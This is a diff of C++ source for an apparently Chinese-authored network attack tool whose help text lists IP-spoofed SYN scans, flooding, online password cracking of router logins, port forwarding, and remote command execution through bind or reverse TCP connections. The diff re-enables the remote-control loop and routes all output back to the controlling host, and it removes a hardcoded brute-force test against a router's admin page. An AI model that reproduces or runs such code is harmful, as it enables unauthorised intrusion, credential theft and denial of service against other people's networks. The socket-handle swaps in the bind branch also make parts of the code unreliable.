@@ -25,6 +25,7 @@
 #define DEFAULT_BIND_PORT 443
 
 #define COMMAND_BUFFER_LENGTH 1024
+#define RESULE_BUFFER_LENGTH  1024
 
 enum execute_state {
     ERROR=0,
@@ -32,13 +33,16 @@ enum execute_state {
     EXIT
 };
 
+static void output_data(const string output);
 static void default_crack_dictionary(dictionary& output_dictionary);
-static void default_tcp_scan_fake_ip_(string target_ip,unsigned int target_port,split_block_result fake_ip,string& output_information);
-static void default_tcp_scan_fake_ip(string target_ip,split_block_result fake_ip,string& output_information);
-static void default_tcp_scan_(string target_ip,unsigned int target_port,string& output_information);
-static void default_tcp_scan (string target_ip,string& output_information);
+static void default_tcp_scan_fake_ip_(string target_ip,unsigned int target_port,split_block_result fake_ip);
+static void default_tcp_scan_fake_ip(string target_ip,split_block_result fake_ip);
+static void default_tcp_scan_(string target_ip,unsigned int target_port);
+static void default_tcp_scan (string target_ip);
 
 static string control_ip;
+static bool control_stat=false;
+static unsigned int tcp_handle=-1;
 
 /*
 
@@ -79,16 +83,15 @@ static const string command_arplist("arp"),
                     //  显示帮助
                     command_quit("quit");
 
-static execute_state execute_command(const string command,string& output_result) {
+static execute_state execute_command(const string command) {
     if (!command.empty()) {
         split_block_result split(split_block(command," "));
         unsigned int result_length=split.size();
-        output_result="ERROR!\r\n";
 
         if (result_length) {
+            string output_inforation;
             if (command_arplist==split[0]) {
-                output_result="arp discover :\r\n";
-
+                output_data("arp discover :\r\n");
                 if (255>=network_session_size) {
                     split_result split(split_string(network_session,"."));
                     string network_session_(split.first);
@@ -107,15 +110,17 @@ static execute_state execute_command(const string command,string& output_result)
                         unsigned char target_mac[ETH_ADDRESS_LENGTH]={0};
                         char mac[0x20]={0};
                         machine_index_+=number_to_string(machine_index);
-
                         if (scan_arp(machine_index_.c_str(),(char*)target_mac)) {
                             sprintf(mac,"%X-%X-%X-%X-%X-%X",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
-                            output_result+="live:";
-                            output_result+=machine_index_.c_str();
-                            output_result+=" mac:";
-                            output_result+=mac;
-                            output_result+="\r\n";
+                            output_inforation="live:";
+                            output_inforation+=machine_index_.c_str();
+                            output_inforation+=" mac:";
+                            output_inforation+=mac;
+                        } else {
+                            output_inforation="dead:";
+                            output_inforation+=machine_index_.c_str();
                         }
+                        output_data(output_inforation);
                     }
                     return OK;
                 }  //  WARNING! 没有补全
@@ -123,51 +128,52 @@ static execute_state execute_command(const string command,string& output_result)
                 return ERROR;
             } else if (command_network_information==split[0]) {
                 char mac[0x20]={0};
-                output_result="local network information :\r\n";
-                output_result+="local_ip:";
-                output_result+=local_ip;
-                output_result+="\r\nlocal_mac:";
+                output_inforation="local network information :\r\n";
+                output_inforation+="local_ip:";
+                output_inforation+=local_ip;
+                output_inforation+="\r\nlocal_mac:";
                 sprintf(mac,"%X-%X-%X-%X-%X-%X",local_mac[0],local_mac[1],local_mac[2],local_mac[3],local_mac[4],local_mac[5]);
-                output_result+=mac;
-                output_result+="\r\nnetwork_mask:";
-                output_result+=network_mask;
-                output_result+="\r\ngateway_ip:";
-                output_result+=gateway_ip;
-                output_result+="\r\ngateway_mac:";
+                output_inforation+=mac;
+                output_inforation+="\r\nnetwork_mask:";
+                output_inforation+=network_mask;
+                output_inforation+="\r\ngateway_ip:";
+                output_inforation+=gateway_ip;
+                output_inforation+="\r\ngateway_mac:";
                 sprintf(mac,"%X-%X-%X-%X-%X-%X",gateway_mac[0],gateway_mac[1],gateway_mac[2],gateway_mac[3],gateway_mac[4],gateway_mac[5]);
-                output_result+=mac;
-                output_result+="\r\ndhcp_server:";
-                output_result+=dhcp_server;
-                output_result+="\r\n";
-
+                output_inforation+=mac;
+                output_inforation+="\r\ndhcp_server:";
+                output_inforation+=dhcp_server;
+                output_inforation+="\r\n";
+                output_data(output_inforation);
                 return OK;
             } else if (command_ping==split[0]) {
                 if (2!=result_length) return ERROR;
 
                 reply ping_reply;
-                output_result="ping - target:";
-                output_result+=split[1];
-                output_result+="\r\n";
+
+                output_inforation="ping - target:";
+                output_inforation+=split[1];
+                output_inforation+="\r\n";
 
                 if (scan_icmp(split[1].c_str(),&ping_reply)) {
-                    output_result+="target live \r\n";
-                    output_result+="ping count:";
-                    output_result+=number_to_string(ping_reply.count);
-                    output_result+="  ping lost:";
-                    output_result+=number_to_string(ping_reply.lost);
-                    output_result+="  ping average delay:";
-                    output_result+=number_to_string(ping_reply.delay);
-                    output_result+="\r\n";
+                    output_inforation+="target live \r\n";
+                    output_inforation+="ping count:";
+                    output_inforation+=number_to_string(ping_reply.count);
+                    output_inforation+="  ping lost:";
+                    output_inforation+=number_to_string(ping_reply.lost);
+                    output_inforation+="  ping average delay:";
+                    output_inforation+=number_to_string(ping_reply.delay);
+                    output_inforation+="\r\n";
                 } else
-                    output_result+="target dead \r\n";
-
+                    output_inforation+="target dead \r\n";
+                output_data(output_inforation);
                 return OK;
             } else if (command_scan_port==split[0]) {
                 string flag_port("-P"),flag_fake("-F");
 
                 if (2==result_length) {
-                    output_result="scan default port:\r\n";
-                    default_tcp_scan(split[1],output_result);
+                    output_inforation="scan default port:\r\n";
+                    default_tcp_scan(split[1]);
 
                     return OK;
                 } else if (3==result_length) {
@@ -178,17 +184,17 @@ static execute_state execute_command(const string command,string& output_result)
 
                     if (!flag.empty() && !arg_list_string.empty()) {
                         if (flag_port==flag) {
-                            output_result="scan custom port:\r\n";
+                            output_data("scan custom port:\r\n");
                             for (split_block_result::const_iterator iterator=arg_list_.begin();
                                                                     iterator!=arg_list_.end();
                                                                     ++iterator) {
                                 unsigned int port=string_to_number(iterator->c_str());
-                                default_tcp_scan_(ip,port,output_result);
+                                default_tcp_scan_(ip,port);
                             }
                             return OK;
                         } else if (flag_fake==flag) {
-                            output_result="scan port for fake ip:\r\n";
-                            default_tcp_scan_fake_ip(ip,arg_list_,output_result);
+                            output_data("scan port for fake ip:\r\n");
+                            default_tcp_scan_fake_ip(ip,arg_list_);
 
                             return OK;
                         }
@@ -204,8 +210,7 @@ static execute_state execute_command(const string command,string& output_result)
 
                     if (!flag_1.empty() && !arg_list_string_1.empty() && !flag_2.empty() && !arg_list_string_2.empty()) {
                         split_block_result fake_ip_list,port_list;
-                        output_result="scan custom port for fake ip:\r\n";
-
+                        output_data("scan custom port for fake ip:\r\n");
                         if (flag_port==flag_1) {
                             fake_ip_list=arg_list_2;
                             port_list=arg_list_1;
@@ -219,7 +224,7 @@ static execute_state execute_command(const string command,string& output_result)
                                                                 iterator!=port_list.end();
                                                                 ++iterator) {
                             unsigned int port=string_to_number(iterator->c_str());
-                            default_tcp_scan_fake_ip_(ip,port,fake_ip_list,output_result);
+                            default_tcp_scan_fake_ip_(ip,port,fake_ip_list);
                         }
                         return OK;
                     }
@@ -252,20 +257,21 @@ static execute_state execute_command(const string command,string& output_result)
 
                     if (-1!=port && check_ip(ip.c_str())) {
                         crack_index result=network_crack_http(ip,port,crack_dictionary,express,success_term);
-                        output_result="network crack - target:";
-                        output_result+=ip;
-                        output_result+=":";
-                        output_result+=port_;
-                        output_result+="\r\n";
+                        output_inforation="network crack - target:";
+                        output_inforation+=ip;
+                        output_inforation+=":";
+                        output_inforation+=port_;
+                        output_inforation+="\r\n";
                         if (result.first.empty() && result.second.empty()) {
-                            output_result+="crack error! no success username and password!\r\n";
+                            output_inforation+="crack error! no success username and password!\r\n";
                         } else {
-                            output_result+="username:";
-                            output_result+=result.first;
-                            output_result+="password:";
-                            output_result+=result.second;
-                            output_result+="\r\n";
+                            output_inforation+="username:";
+                            output_inforation+=result.first;
+                            output_inforation+="password:";
+                            output_inforation+=result.second;
+                            output_inforation+="\r\n";
                         }
+                        output_data(output_inforation);
                         return OK;
                     }
                 }
@@ -273,20 +279,20 @@ static execute_state execute_command(const string command,string& output_result)
             } else if (command_tracert==split[0]) {
                 tracert_list result=scan_icmp_tracert(split[1].c_str());
                 unsigned int tracert_index=0;
-                output_result="tracert route - target:";
-                output_result+=split[1];
-                output_result+="\r\n";
+                output_inforation="tracert route - target:";
+                output_inforation+=split[1];
+                output_inforation+="\r\n";
 
                 for (tracert_list::const_iterator iterator=result.begin();
                                                   iterator!=result.end();
                                                   ++iterator,++tracert_index) {
                     string number=number_to_string(tracert_index);
-                    output_result+=number;
-                    output_result+=":";
-                    output_result+=*iterator;
-                    output_result+="\r\n";
+                    output_inforation+=number;
+                    output_inforation+=":";
+                    output_inforation+=*iterator;
+                    output_inforation+="\r\n";
                 }
-
+                output_data(output_inforation);
                 return OK;
             } else if (command_getpage==split[0]) {
                 scan_tcp_port_information port_information={0};
@@ -329,13 +335,14 @@ static execute_state execute_command(const string command,string& output_result)
                 unsigned int port=string_to_number(port_);
                 
                 if (scan_tcp_get_data(target_ip.c_str(),port,path.c_str(),&port_information)) {
-                    output_result="getpage port(";
-                    output_result+=number_to_string(port_information.port);
-                    output_result+=") page-length(";
-                    output_result+=number_to_string(port_information.data_length);
-                    output_result+=") pagedata:\r\n";
-                    output_result+=port_information.data;
-                    output_result+="\r\n";
+                    output_inforation="getpage port(";
+                    output_inforation+=number_to_string(port_information.port);
+                    output_inforation+=") page-length(";
+                    output_inforation+=number_to_string(port_information.data_length);
+                    output_inforation+=") pagedata:\r\n";
+                    output_inforation+=port_information.data;
+                    output_inforation+="\r\n";
+                    output_data(output_inforation);
                     return OK;
                 }
                 return ERROR;
@@ -385,43 +392,43 @@ static execute_state execute_command(const string command,string& output_result)
                     unsigned int remote_port=string_to_number(remote_port_),local_port=string_to_number(local_port_);
                     
                     if (network_route(remote_ip.c_str(),remote_port,local_ip.c_str(),local_port)) {
-                        output_result="route turn on => (remote ";
-                        output_result+=remote_ip.c_str();
-                        output_result+=":";
-                        output_result+=number_to_string(remote_port);
-                        output_result+=",local ";
-                        output_result+=local_ip.c_str();
-                        output_result+=":";
-                        output_result+=number_to_string(local_port);
-                        output_result+=")\r\n";
-
+                        output_inforation="route turn on => (remote ";
+                        output_inforation+=remote_ip.c_str();
+                        output_inforation+=":";
+                        output_inforation+=number_to_string(remote_port);
+                        output_inforation+=",local ";
+                        output_inforation+=local_ip.c_str();
+                        output_inforation+=":";
+                        output_inforation+=number_to_string(local_port);
+                        output_inforation+=")\r\n";
+                        output_data(output_inforation);
                         return OK;
                     }
                 }
 
                 return ERROR;
             } else if (command_help==split[0]) {
-                output_result="help:\r\n";
-                output_result+="扫描当前网段存活的主机,并且自动搜集数据\r\n";
-                output_result+="using:arp\r\n";
-                output_result+="获取当前主机的网络信息\r\n";
-                output_result+="using:local\r\n";
-                output_result+="测试主机是否连通\r\n";
-                output_result+="TCP SYN 扫描主机\r\n";
-                output_result+="using:scan %ip% [-P:[port1,port2,port3,...]] [-F:[fake_ip1,fake_ip2,...]]\r\n";
-                output_result+="洪水攻击主机\r\n";
-                output_result+="using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]\r\n";
-                output_result+="在线破解\r\n";
-                output_result+="using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]\r\n";
-                output_result+="路由跟踪\r\n";
-                output_result+="using:tracert %ip%\r\n";
-                output_result+="抓取页面\r\n";
-                output_result+="using:getpage %ip% [-PORT:%port%] [-PATH:%path%]\r\n";
-                output_result+="启动端口转发功能\r\n";
-                output_result+="using:route -R:[%remote_ip%,%remote_port%] -L:[[%local_ip%,]%local_port%]\r\n";
-                output_result+="退出\r\n";
-                output_result+="using:quit\r\n";
-
+                output_inforation="help:\r\n";
+                output_inforation+="扫描当前网段存活的主机,并且自动搜集数据\r\n";
+                output_inforation+="using:arp\r\n";
+                output_inforation+="获取当前主机的网络信息\r\n";
+                output_inforation+="using:local\r\n";
+                output_inforation+="测试主机是否连通\r\n";
+                output_inforation+="TCP SYN 扫描主机\r\n";
+                output_inforation+="using:scan %ip% [-P:[port1,port2,port3,...]] [-F:[fake_ip1,fake_ip2,...]]\r\n";
+                output_inforation+="洪水攻击主机\r\n";
+                output_inforation+="using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]\r\n";
+                output_inforation+="在线破解\r\n";
+                output_inforation+="using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]\r\n";
+                output_inforation+="路由跟踪\r\n";
+                output_inforation+="using:tracert %ip%\r\n";
+                output_inforation+="抓取页面\r\n";
+                output_inforation+="using:getpage %ip% [-PORT:%port%] [-PATH:%path%]\r\n";
+                output_inforation+="启动端口转发功能\r\n";
+                output_inforation+="using:route -R:[%remote_ip%,%remote_port%] -L:[[%local_ip%,]%local_port%]\r\n";
+                output_inforation+="退出\r\n";
+                output_inforation+="using:quit\r\n";
+                output_data(output_inforation);
                 return OK;
             } else if (command_quit==split[0]) {
                 return EXIT;
@@ -431,10 +438,6 @@ static execute_state execute_command(const string command,string& output_result)
     return ERROR;
 }
 void main(int arg_count,char** arg_list) {
-
-
-/*
-
     local_network_init();
 
     if (1==arg_count) {
@@ -445,44 +448,46 @@ void main(int arg_count,char** arg_list) {
         while (true) {
             gets(command_buffer);
 
-            if (EXIT==execute_command(command_buffer,output_infomation)) {
-                printf("user exit!\n");
-                goto EXIT;
+            switch (execute_command(command_buffer)) {
+                case EXIT:
+                    output_data("user exit!\n");
+                    goto EXIT;
+                case ERROR:
+                    output_data("ERROR!\r\n");
             }
-            printf("output:\n%s\n",output_infomation.c_str());
             memset(command_buffer,0,COMMAND_BUFFER_LENGTH);
         }
     } else {
+        control_stat=true;
         if (!strcmp(arg_list[1],LANUCH_COMMAND_BIND)) {
             //scanner.exe -bind | scanner.exe -bind %port%
-            unsigned int tcp_handle=-1;
             unsigned int client_handle=-1;
             if (2==arg_count) {
-                tcp_handle=scan_tcp_bind(DEFAULT_BIND_PORT);
+                client_handle=scan_tcp_bind(DEFAULT_BIND_PORT);
                 if (-1==tcp_handle) {
-                    printf("create bind error!\n");
+                    output_data("create bind error!\n");
                     goto EXIT;
                 }
-                client_handle=scan_tcp_accept(tcp_handle);
+                tcp_handle=scan_tcp_accept(client_handle);
                 if (-1==client_handle) {
-                    printf("accept connect error!\n");
-                    scan_tcp_disconnect(tcp_handle);
+                    output_data("accept connect error!\n");
+                    scan_tcp_disconnect(client_handle);
                     goto EXIT;
                 }
             } else if (3==arg_count) {
-                tcp_handle=scan_tcp_bind(string_to_number(arg_list[2]));
+                client_handle=scan_tcp_bind(string_to_number(arg_list[2]));
                 if (-1==tcp_handle) {
-                    printf("create bind error!\n");
+                    output_data("create bind error!\n");
                     goto EXIT;
                 }
-                client_handle=scan_tcp_accept(tcp_handle);
+                tcp_handle=scan_tcp_accept(client_handle);
                 if (-1==client_handle) {
-                    printf("accept connect error!\n");
-                    scan_tcp_disconnect(tcp_handle);
+                    output_data("accept connect error!\n");
+                    scan_tcp_disconnect(client_handle);
                     goto EXIT;
                 }
             } else {
-                printf("use command \"-bind\":-bind or -bind %port%\n");
+                output_data("use command \"-bind\":-bind or -bind %port%\n");
                     goto EXIT;
             }
             char command_buffer[COMMAND_BUFFER_LENGTH]={0};
@@ -497,18 +502,13 @@ void main(int arg_count,char** arg_list) {
                 }
                 network_decode(command_buffer,recv_length);
 
-                if (EXIT==execute_command(command_buffer,output_infomation)) {
-                    scan_tcp_disconnect(tcp_handle);
-                    printf("user exit!\n");
-                    goto EXIT;
+                switch (execute_command(command_buffer)) {
+                    case EXIT:
+                        output_data("user exit!\n");
+                        goto EXIT;
+                    case ERROR:
+                        output_data("ERROR!\r\n");
                 }
-                unsigned send_length=output_infomation.length();
-                char* send_buffer=new char[send_length];
-                memcpy(send_buffer,output_infomation.c_str(),send_length);
-                send_length=network_encode(send_buffer,send_length);
-                scan_tcp_send(tcp_handle,send_buffer,send_length);
-                delete send_buffer;
-                memset(command_buffer,0,COMMAND_BUFFER_LENGTH);
             }
         }
         if (!strcmp(arg_list[1],LANUCH_COMMAND_REVERSE_CONNENT)) {
@@ -519,7 +519,7 @@ void main(int arg_count,char** arg_list) {
                 if (4==arg_count)
                     port_=arg_list[3];
                 unsigned short port=string_to_number(port_.c_str());
-                unsigned int tcp_handle=scan_tcp_connect(ip.c_str(),port);
+                tcp_handle=scan_tcp_connect(ip.c_str(),port);
 
                 if (-1!=tcp_handle) {
                     control_ip=ip;
@@ -535,58 +535,39 @@ void main(int arg_count,char** arg_list) {
                         }
                         network_decode(command_buffer,recv_length);
 
-                        if (EXIT==execute_command(command_buffer,output_infomation)) {
-                            scan_tcp_disconnect(tcp_handle);
-                            printf("user exit!\n");
-                            goto EXIT;
+                        switch (execute_command(command_buffer)) {
+                            case EXIT:
+                                output_data("user exit!\n");
+                                goto EXIT;
+                            case ERROR:
+                                output_data("ERROR!\r\n");
                         }
-                        unsigned send_length=output_infomation.length();
-                        char* send_buffer=new char[send_length];
-                        memcpy(send_buffer,output_infomation.c_str(),send_length);
-                        send_length=network_encode(send_buffer,send_length);
-                        scan_tcp_send(tcp_handle,send_buffer,send_length);
-                        delete send_buffer;
-                        memset(command_buffer,0,COMMAND_BUFFER_LENGTH);
                     }
                 } else {
-                    printf("reverse tcp connect error!\n");
+                    output_data("reverse tcp connect error!\n");
                     goto EXIT;
                 }
             } else
-                printf("using:scanner.exe -recon %%ip%% [%%port%%]\n");
+                output_data("using:scanner.exe -recon %%ip%% [%%port%%]\n");
         }
     }
-    printf("ERR COMMAND!\n");
+    output_data("ERR COMMAND!\n");
 
 EXIT:
     local_network_clean();
+}
 
-
-*/
-
-    local_network_init();
-
-    dictionary crack_dictionary;
-    default_crack_dictionary(crack_dictionary);
-
-#define TEST_LINK "GET http://192.168.1.1:80/ HTTP/1.1\r\n" \
-                  "Host: 192.168.1.1\r\n" \
-                  "Proxy-Connection: keep-alive\r\n" \
-                  "Cache-Control: max-age=0\r\n" \
-                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" \
-                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36\r\n" \
-                  "Referer: http://192.168.1.1/\r\n" \
-                  "Accept-Encoding: gzip, deflate, sdch\r\n" \
-                  "Accept-Language: zh-CN,zh;q=0.8\r\n" \
-                  "Cookie: a2404_pages=10; a2404_times=5; Authorization=Basic%20base64(admin:%password%)\r\n" \
-                  "\r\n" \
-                  "\r\n"
-
-    crack_index result=network_crack_http("192.168.1.1",80,crack_dictionary,TEST_LINK,"/userRpm/Index.htm");
-
-    printf("username=%s password=%s",result.first.c_str(),result.second.c_str());
-    
-    local_network_clean();
+static void output_data(const string output) {
+    if (!control_stat) {
+        printf("%s\n",output.c_str());
+    } else {
+        unsigned send_length=output.length();
+        char send_buffer[RESULE_BUFFER_LENGTH]={0};
+        memcpy(send_buffer,output.c_str(),send_length);
+        send_length=network_encode(send_buffer,send_length);
+        scan_tcp_send(tcp_handle,send_buffer,send_length);
+        sleep(50);
+    }
 }
 
 static void default_crack_dictionary(dictionary& output_dictionary) {
@@ -600,73 +581,55 @@ static void default_crack_dictionary(dictionary& output_dictionary) {
         resolve_dictionary_add_password(output_dictionary,password[index]);
 }
 
-static void default_tcp_scan_(string target_ip,unsigned int target_port,string& output_information) {
+static void default_tcp_scan_(string target_ip,unsigned int target_port) {
+    string output_information;
     output_information+=number_to_string(target_port);
     output_information+=":";
     if (scan_tcp(target_ip.c_str(),target_port))
-        output_information+="open\r\n";
+        output_information+="open";
     else
-        output_information+="close\r\n";
+        output_information+="close";
+    output_data(output_information);
 }
 
-static void default_tcp_scan_fake_ip_(string target_ip,unsigned int target_port,split_block_result fake_ip,string& output_information) {
+static void default_tcp_scan_fake_ip_(string target_ip,unsigned int target_port,split_block_result fake_ip) {
     for (split_block_result::const_iterator iterator=fake_ip.begin();
                                             iterator!=fake_ip.end();
                                             ++iterator) {
         scan_tcp_fake_ip(target_ip.c_str(),target_port,iterator->c_str(),SCAN_TCP_PORT);
     }
-    default_tcp_scan_(target_ip,target_port,output_information);
+    default_tcp_scan_(target_ip,target_port);
 }
 
-static void default_tcp_scan(string target_ip,string& output_information) {
+static void default_tcp_scan_fake_ip(string target_ip,split_block_result fake_ip) {
     // 80,8080,3128,8081,9080,1080,21,23,443,69,22,25,110,7001,9090,3389,1521,1158,2100,1433,135,139,445,1025
-    default_tcp_scan_(target_ip,22,output_information);
-    default_tcp_scan_(target_ip,23,output_information);
-    default_tcp_scan_(target_ip,25,output_information);
-    default_tcp_scan_(target_ip,69,output_information);
-    default_tcp_scan_(target_ip,80,output_information);
-    default_tcp_scan_(target_ip,110,output_information);
-    default_tcp_scan_(target_ip,135,output_information);
-    default_tcp_scan_(target_ip,139,output_information);
-    default_tcp_scan_(target_ip,443,output_information);
-    default_tcp_scan_(target_ip,445,output_information);
-    default_tcp_scan_(target_ip,1025,output_information);
-    default_tcp_scan_(target_ip,1080,output_information);
-    default_tcp_scan_(target_ip,1158,output_information);
-    default_tcp_scan_(target_ip,1433,output_information);
-    default_tcp_scan_(target_ip,1521,output_information);
-    default_tcp_scan_(target_ip,2100,output_information);
-    default_tcp_scan_(target_ip,3128,output_information);
-    default_tcp_scan_(target_ip,3389,output_information);
-    default_tcp_scan_(target_ip,7001,output_information);
-    default_tcp_scan_(target_ip,8080,output_information);
-    default_tcp_scan_(target_ip,8081,output_information);
-    default_tcp_scan_(target_ip,9080,output_information);
-    default_tcp_scan_(target_ip,9090,output_information);
+    default_tcp_scan_fake_ip_(target_ip,22,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,23,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,25,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,69,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,80,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,110,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,135,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,139,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,443,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,445,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,1025,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,1080,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,1158,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,1433,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,1521,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,2100,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,3128,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,3389,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,7001,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,8080,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,8081,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,9080,fake_ip);
+    default_tcp_scan_fake_ip_(target_ip,9090,fake_ip);
 }
 
-static void default_tcp_scan_fake_ip(string target_ip,split_block_result fake_ip,string& output_information) {
-    default_tcp_scan_fake_ip_(target_ip,22,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,23,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,25,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,69,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,80,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,110,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,135,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,139,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,443,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,445,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,1025,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,1080,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,1158,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,1433,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,1521,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,2100,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,3128,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,3389,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,7001,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,8080,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,8081,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,9080,fake_ip,output_information);
-    default_tcp_scan_fake_ip_(target_ip,9090,fake_ip,output_information);
+static void default_tcp_scan(string target_ip) {
+    split_block_result ip;
+    ip.push_back(local_ip);
+    default_tcp_scan_fake_ip(target_ip,ip);
 }
